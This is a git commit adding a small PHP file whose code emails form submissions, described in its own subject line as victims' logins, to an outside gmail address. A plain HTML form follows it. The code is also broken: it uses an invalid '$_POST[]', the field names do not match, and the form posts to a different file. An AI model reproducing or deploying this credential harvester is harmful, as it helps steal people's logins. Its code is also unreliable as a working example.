08886608b47a09308bda7b56bbc988a8109aff53
Theree <83382093+Therqy@users.noreply.github.com>
2021-12-04 20:56:36 -0600

    dsad
    asda

---
+++ lol.php
@@ -0,0 +1,21 @@
+<?php
+if($_POST["Message"]) {
+mail("gdtheroy@gmail.com", "Here is another bozos login LOL",
+$_POST[]. "From: theroy0828@gmail.com");
+}
+?>
+
+<!DOCTYPE html>
+<html>
+ <head>
+    <title>hehe</title>
+  </head>
+  <body>
+
+    <form method="post" action="lmao.php">
+    <textarea name="message"></textarea>
+    <input type="submit">
+    </form>
+
+  </body>
+</html>
